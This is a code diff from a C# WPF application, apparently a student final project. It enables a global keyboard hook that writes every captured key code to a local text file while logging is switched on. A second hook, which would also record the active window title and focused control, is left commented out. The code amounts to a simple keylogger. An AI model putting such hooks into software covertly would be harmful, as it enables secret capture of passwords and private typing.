@@ -22,30 +22,30 @@ namespace AbschlussprojektWPF
 
         protected override void OnStartup(StartupEventArgs e)
         {
-            //using (var api = new KeystrokeAPI())
-            //{
-            //    KeystrokeAPI ki = new KeystrokeAPI();
-            //    api.CreateKeyboardHook((character) =>
-            //    {
-            //        if (IsLoggingStarted)
-            //        {
-            //            ////////////////////// Logik für Filter kommt hierhin //////////////////////////////
-            //            File.AppendAllText(@"D:\KeysOnly.txt", character + "\r\n\r\n");
+            using (var api = new KeystrokeAPI())
+            {
+                KeystrokeAPI ki = new KeystrokeAPI();
+                api.CreateKeyboardHook((character) =>
+                {
+                    if (IsLoggingStarted)
+                    {
+                        ////////////////////// Logik für Filter kommt hierhin //////////////////////////////
+                        File.AppendAllText(@"D:\KeysOnly.txt", character.KeyCode + "\r\n\r\n");
 
-            //        }
-            //    });
-            //    api.CreateKeyboardHook((character) =>
-            //    {
-            //        if (IsLoggingStarted)
-            //        {
-            //            File.AppendAllText(@"D:\KeyLog.txt",
-            //                character + " " + LogFile.GetTitleOfActiveWindow() + " " + LogFile.GetFocusedControl() +
-            //                "\r\n\r\n");
-            //        }
-            //    });
+                    }
+                });
+                //api.CreateKeyboardHook((character) =>
+                //{
+                //    if (IsLoggingStarted)
+                //    {
+                //        File.AppendAllText(@"D:\KeyLog.txt",
+                //            character + " " + LogFile.GetTitleOfActiveWindow() + " " + LogFile.GetFocusedControl() +
+                //            "\r\n\r\n");
+                //    }
+                //});
 
-            //}
-            //base.OnStartup(e);
+            }
+            base.OnStartup(e);
         }
     }
 }
